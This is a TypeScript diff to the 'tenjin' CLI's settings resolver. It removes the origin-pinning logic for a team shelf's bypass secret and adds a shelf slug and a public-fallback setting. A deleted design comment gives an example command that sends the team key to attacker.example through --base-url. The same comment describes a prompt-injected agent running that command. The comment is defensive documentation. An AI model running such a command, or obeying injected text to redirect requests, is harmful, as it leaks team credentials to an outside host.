@@ -20,11 +20,10 @@ import type {
   PartialConfig,
   Provenance,
   ProjectPublishLayer,
+  PublicFallback,
   PublishMode,
 } from './config';
-import type { ShelfBypass } from './http';
 import { parseUsdToAtomic } from './money';
-import { PRODUCTION_ORIGIN, isSameDeployment } from './production-origin';
 import { parseConfirmPolicy, type SpendPolicy } from './policy';
 import type { CommandContext } from '../context';
 
@@ -39,27 +38,23 @@ export interface ResolvedSettings {
    * `baseUrl` AS THE CONFIG FILE NAMES IT, before `--base-url`/`TENJIN_BASE_URL`.
    * Anything that wallet-signs pins to this rather than to {@link baseUrl}: a
    * flag can point a run at another host, and an agent that names one must not
-   * thereby move the pin. Same rule, same reason, as {@link resolveShelfBypass}.
+   * thereby move the pin.
    */
   configuredBaseUrl: string;
-  /** The public marketplace: the second shelf a team-mode search falls through
-   *  to, and the one other origin `read`/`buy`/`inspect` will resolve against. */
-  publicShelfUrl: string;
   /**
-   * The team shelf's bypass secret paired with the CONFIGURED `baseUrl`'s
-   * origin, or undefined in public mode and on a run whose base URL came from
-   * `--base-url`/`TENJIN_BASE_URL` (see {@link resolveShelfBypass}). Handed to
-   * the transport, which attaches the header from the REQUEST URL — so it cannot
-   * reach `publicShelfUrl` however it is passed.
+   * The active shelf's slug, or null for public only. "On a shelf" is exactly
+   * `shelf !== null`: nothing is inferred from the base URL or from a secret.
+   * Read file-or-default, so a `--base-url` on one run never moves it.
    */
-  bypass?: ShelfBypass;
-  /** True exactly when the door key was issued: the one switch between public
-   *  mode and team mode. */
-  teamMode: boolean;
+  shelf: string | null;
   rpcUrl: string;
   policy: SpendPolicy;
   /** Search-only privacy opt-in; sends X-Tenjin-Eval-Cohort: 1 when true. */
   evalCohort: boolean;
+  /** This machine's preference for whether a shelf search also asks the public
+   *  marketplace. It is what the CLI sends as `includePublic`; the org's own
+   *  `public_search` policy bounds it on the server. */
+  teamPublicFallback: PublicFallback;
   /** Bazaar pay lane opt-in (`tenjin pay` off the configured base URL). */
   bazaarPay: boolean;
   /** x402 discovery registries `discover` queries and the pay lane verifies against. */
@@ -72,201 +67,16 @@ export interface ResolvedSettings {
   sendMaxAmountAtomic: bigint | null | typeof SEND_MAX_UNSET;
 }
 
-/** `URL.origin`, or undefined for anything unparseable. */
-function tryOrigin(url: string): string | undefined {
-  try {
-    return new URL(url).origin;
-  } catch {
-    return undefined;
-  }
-}
-
-/**
- * The team shelf's door key, paired with the origin THE OPERATOR CONFIGURED —
- * never with the one this run happens to be pointed at.
- *
- * `shelfBypassSecret` is file-only, but `baseUrl` is not: `--base-url` and
- * `TENJIN_BASE_URL` outrank the file. Pairing the secret with the RESOLVED base
- * URL therefore let one command hand the team's key to any host that was named
- * on the command line — `tenjin search --base-url https://attacker.example "…"`
- * sends it in the first request, and the transport's origin test agrees, because
- * the pair it compares against was built from the attacker's URL. That is not a
- * hypothetical shape: `resource-ref`'s own refusal text already names a
- * task-supplied `--base-url` as the attack a prompt-injected agent runs.
- *
- * So the compare happens here, once, before the pair exists: the key is issued
- * only when the run is still pointed at the configured shelf. A run pointed
- * anywhere else gets NO pair at all, which also drops team mode — an overridden
- * base URL runs as an ordinary public-mode run, with the client scan and the
- * confirm cascade back on, rather than as a team-mode run against a stranger.
- *
- * The generated hooks need no equivalent for the flag rule: they read `baseUrl`
- * straight out of config.json and have no flag or env layer to be re-pointed
- * through. They DO carry the second rule below (`teamShelfOrigin`).
- *
- * SECOND RULE: THE TEAM SHELF MUST BE A SHELF OF ITS OWN. Team mode was keyed on
- * a non-empty secret alone, and both `baseUrl` and `publicShelfUrl` default to
- * tenjin.blog, so the two-command day-0 setup run in the other order — or the
- * secret line alone on a second machine — put a machine in "team mode" pointed
- * at the PUBLIC MARKETPLACE. Team mode is precisely the mode that skips the
- * publish scan, skips the confirm cascade and prices at 0, so under
- * `publish.mode full-auto` that misconfiguration auto-publishes internal
- * codebase notes to tenjin.blog, unscanned and unacknowledged; it also posts the
- * team's key to the public marketplace and searches one origin twice per fire.
- * A secret with no private shelf behind it is a setup that is not finished, so
- * it fails safe to public mode rather than half-on. `tenjin doctor` and
- * `config set shelfBypassSecret` say so out loud, because silence here is what
- * made the misconfiguration survivable.
- */
-export function resolveShelfBypass(
-  config: PartialConfig,
-  s: EffectiveSettings,
-): ShelfBypass | undefined {
-  const secret = s.shelfBypassSecret.value;
-  if (secret.length === 0) return undefined;
-  const configured = tryOrigin(config.baseUrl ?? CONFIG_DEFAULTS.baseUrl);
-  const effective = tryOrigin(s.baseUrl.value);
-  if (configured === undefined || effective === undefined || configured !== effective) {
-    return undefined;
-  }
-  if (!isTeamShelfOrigin(configured, s.publicShelfUrl.value)) return undefined;
-  return { origin: configured, secret };
-}
-
-/**
- * Is `origin` a shelf of the team's own, as opposed to the public marketplace?
- *
- * The compare `resource-ref` already makes to no-op its second-origin allowance,
- * plus the production origin itself: a `publicShelfUrl` pointed somewhere else
- * must not make tenjin.blog read as private. `isSameDeployment` rather than `===`
- * so an alias of production (tenjin.sh) is not a loophole.
- */
-export function isTeamShelfOrigin(origin: string, publicShelfUrl: string): boolean {
-  if (isSameDeployment(origin, PRODUCTION_ORIGIN)) return false;
-  const publicOrigin = tryOrigin(publicShelfUrl);
-  return publicOrigin === undefined || !isSameDeployment(origin, publicOrigin);
-}
-
-/**
- * Is this MACHINE in team mode — a shelf of the team's own plus the door key that
- * opens it? The same two-part rule `resolveContextSettings` applies
- * (`ResolvedSettings.teamMode`), read off the raw config instead of resolved
- * settings, and the difference is deliberate: a `--base-url` or `TENJIN_BASE_URL`
- * on one invocation must not answer this question.
- *
- * The installed skill text (lib/skill-materialize) needs the raw-config form: it
- * outlives the command that wrote it and is read by every later session on this
- * machine, so shaping it by a one-off flag would leave a team machine reading
- * public guidance until the next install.
- *
- * A secret with `baseUrl` still on the marketplace is NOT team mode, per
- * {@link isTeamShelfOrigin}: that half-set state runs as ordinary public mode
- * rather than treating tenjin.blog as a private shelf.
- */
-export function isTeamModeConfig(config: PartialConfig): boolean {
-  const secret = config.shelfBypassSecret ?? CONFIG_DEFAULTS.shelfBypassSecret;
-  if (typeof secret !== 'string' || secret === '') return false;
-  const origin = tryOrigin(config.baseUrl ?? CONFIG_DEFAULTS.baseUrl);
-  if (origin === undefined) return false;
-  return isTeamShelfOrigin(origin, config.publicShelfUrl ?? CONFIG_DEFAULTS.publicShelfUrl);
-}
-
-/** Where a close for one stored search has to go, and whether it carries the key. */
-export interface ShelfRoute {
-  baseUrl: string;
-  bypass?: ShelfBypass;
-  /**
-   * False when the ENTRY named a shelf other than the configured `baseUrl` —
-   * including an unrecognised origin, which `baseUrl` above nonetheless routes
-   * back to the configured shelf.
-   */
-  configured: boolean;
-}
-
-/**
- * THE SHELF THAT ANSWERED, for anything closing a loop.
- *
- * A team-mode search asks the team shelf and falls through to the public
- * marketplace, and the two have separate databases: the searchId the public leg
- * minted exists only there. Posting its outcome to the team shelf tells the team
- * shelf about a search it never ran (where it retries a parent-not-visible window
- * and then raises `outcomes_dropped_no_parent`, an alarm meant to mean a broken
- * fleet) and tells the marketplace — whose demand signal is the entire reason the
- * verb exists — nothing at all.
- *
- * `shelfBaseUrl` is absent on an entry written before it existed and on every
- * single-shelf public-mode run, and absent means the configured base, which is
- * what those entries meant.
- *
- * ONLY THE TWO CONFIGURED SHELVES ARE ROUTABLE. `shelfBaseUrl` is a plain
- * optional string in the store schema with no URL validation, and the only
- * writers are this CLI's own two configured values — so any OTHER origin in that
- * field is a corrupt or planted entry, not a third shelf, and one hand-edited
- * search row would otherwise make `tenjin outcome --search-id` POST to
- * a host the operator never configured. An unrecognised origin therefore routes
- * to the configured base exactly as a missing or unparseable one does: fail open
- * to the configured shelf, never out to a foreign one. This is the same
- * re-assertion `resolveResourceRef` already makes against this store's
- * `candidate.url` before any send. `configured` still reports false for such an
- * entry, so `publish` keeps dropping its searchId rather than misfiling it.
- *
- * THE KEY RIDES THE ORIGIN, not the call site: `bypass` comes back only when the
- * route is the origin the secret was paired with. The transport re-derives the
- * same rule from the request URL ({@link shelfBypassHeaders}), so this is the
- * second of two locks rather than the only one — but a call site that reads
- * `route.bypass` should never be the place a key first goes off-origin.
- */
-export function shelfRouteFor(
-  stored: { shelfBaseUrl?: string } | null | undefined,
-  settings: Pick<ResolvedSettings, 'baseUrl' | 'publicShelfUrl' | 'bypass'>,
-): ShelfRoute {
-  const recorded = stored?.shelfBaseUrl;
-  const configuredOrigin = tryOrigin(settings.baseUrl);
-  const recordedOrigin = recorded === undefined ? undefined : tryOrigin(recorded);
-  // An unparseable record is not a second shelf, it is a corrupt field: fall back
-  // to the configured base rather than posting a close nowhere.
-  if (recorded === undefined || recordedOrigin === undefined) {
-    return {
-      baseUrl: settings.baseUrl,
-      ...(settings.bypass !== undefined ? { bypass: settings.bypass } : {}),
-      configured: true,
-    };
-  }
-  const configured =
-    configuredOrigin !== undefined && isSameDeployment(recordedOrigin, configuredOrigin);
-  // The allow-list: the configured base, or the public shelf it falls through to.
-  // Nothing else is a shelf this machine ever searched.
-  const publicOrigin = tryOrigin(settings.publicShelfUrl);
-  const routable =
-    configured || (publicOrigin !== undefined && isSameDeployment(recordedOrigin, publicOrigin));
-  if (!routable) {
-    return {
-      baseUrl: settings.baseUrl,
-      ...(settings.bypass !== undefined ? { bypass: settings.bypass } : {}),
-      configured: false,
-    };
-  }
-  const carries = settings.bypass !== undefined && settings.bypass.origin === recordedOrigin;
-  return {
-    baseUrl: recorded,
-    ...(carries ? { bypass: settings.bypass } : {}),
-    configured,
-  };
-}
-
 export async function resolveContextSettings(ctx: CommandContext): Promise<ResolvedSettings> {
   const config = await loadRawConfig(ctx.dataDir);
   const s = resolveSettings({ config, flags: { baseUrl: ctx.flags.baseUrl }, env: process.env });
-  // Paired with the origin here, once, so no command has to remember to.
-  const bypass = resolveShelfBypass(config, s);
   return {
     baseUrl: s.baseUrl.value,
     configuredBaseUrl: config.baseUrl ?? CONFIG_DEFAULTS.baseUrl,
-    publicShelfUrl: s.publicShelfUrl.value,
-    ...(bypass !== undefined ? { bypass } : {}),
-    teamMode: bypass !== undefined,
+    shelf: s.shelf.value,
     rpcUrl: s.rpcUrl.value,
     evalCohort: s.evalCohort.value,
+    teamPublicFallback: s.teamPublicFallback.value,
     bazaarPay: s.bazaarPay.value,
     bazaarRegistries: s.bazaarRegistries.value,
     sendMaxAmountAtomic:
